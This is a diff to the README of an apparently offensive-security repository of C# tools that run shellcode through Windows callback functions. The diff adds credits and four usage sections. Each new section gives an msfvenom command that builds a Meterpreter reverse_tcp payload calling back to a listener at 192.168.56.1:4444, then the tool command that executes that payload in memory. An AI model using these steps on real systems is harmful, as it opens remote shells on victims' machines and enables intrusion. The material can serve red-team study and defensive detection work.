@@ -3,9 +3,12 @@ NativePayload_CallBackTechniques C# Codes (Code Execution via Callback Functions
 ------------
 Note: These C# Codes Tested by .Net Framework 3.5 or 4.0 only ;) & some of Codes are ready but i will Publish almost all of them from S4R1N C++ repo (soon)
 
-Note: These Useful Techniques made by Security Researcher @S4R1N. 
+Note: These Useful Techniques made by Security Researcher "@S4R1N" also Codes [13,14,15] made by Security Researcher "Chaitanya Haritash"
 
-Special Thanks to S4R1N for Original C++ Source:  https://github.com/S4R1N/AlternativeShellcodeExec
+Special Thanks to "S4R1N" for Original C++ Source:  https://github.com/S4R1N/AlternativeShellcodeExec
+
+Special Thanks to "Chaitanya Haritash" for Original C++ Source:  https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection
+
 --------------------------------------------
 C# Codes: "New C# codes for Callback Functions will publish here soon..."
    
@@ -20,6 +23,10 @@ C# Codes: "New C# codes for Callback Functions will publish here soon..."
     9. NativePayload_EnumerateLoadedModules.cs
     10. NativePayload_CreateThreadPoolWait.cs
     11. NativePayload_CreateTimerQueueTimer.cs
+    12. NativePayload_SymInitialize.cs
+    13. NativePayload_EnumSystemCodePagesA.cs  (by ChaitanyaHaritash)
+    14. NativePayload_EnumSystemLocalesA.cs  (by ChaitanyaHaritash)
+    15. NativePayload_EnumUILanguagesA.cs  (by ChaitanyaHaritash)
 
 --------------------------------------------
    NativePayload_CBT.cs (Some of Callback Function Codes/Techniques in one code)
@@ -156,3 +163,50 @@ usage:
    ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_CreateTimerQueueTimer.png)
 
  --------------------------------------------   
+  12. NativePayload_SymInitialize.cs (Callback Functions Technique via SymInitialize Native API)
+ 
+ usage: 
+    
+    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
+    step2: [win] NativePayload_SymInitialize.exe  [payload...]
+    example: NativePayload_SymInitialize.exe "fc,48,00,87,00,...."
+
+   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_SymInitialize.png)
+   
+ --------------------------------------------   
+   13. NativePayload_EnumSystemCodePagesA.cs (Callback Functions Technique via EnumSystemCodePagesA Native API)
+ 
+ usage: 
+    
+    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
+    step2: [win] NativePayload_EnumSystemCodePagesA.exe  [payload...]
+    example: NativePayload_EnumSystemCodePagesA.exe "fc,48,00,87,00,...."
+
+   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumSystemCodePagesA.png)
+   
+ --------------------------------------------   
+   14. NativePayload_EnumSystemLocalesA.cs (Callback Functions Technique via EnumSystemLocalesA Native API)
+ 
+ usage: 
+    
+    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
+    step2: [win] NativePayload_EnumSystemLocalesA.exe  [payload...]
+    example: NativePayload_EnumSystemLocalesA.exe "fc,48,00,87,00,...."
+
+   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumSystemLocalesA.png)
+   
+ --------------------------------------------   
+   15. NativePayload_EnumUILanguagesA.cs (Callback Functions Technique via EnumUILanguagesA Native API)
+ 
+ usage: 
+    
+    step1: [linux] msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f c > payload.txt
+    step2: [win] NativePayload_EnumUILanguagesA.exe  [payload...]
+    example: NativePayload_EnumUILanguagesA.exe "fc,48,00,87,00,...."
+
+   ![](https://github.com/DamonMohammadbagher/NativePayload_CBT/blob/main/Pics/_CallBack_EnumUILanguagesA.png)
+   
+ --------------------------------------------   
+    
+
+ 
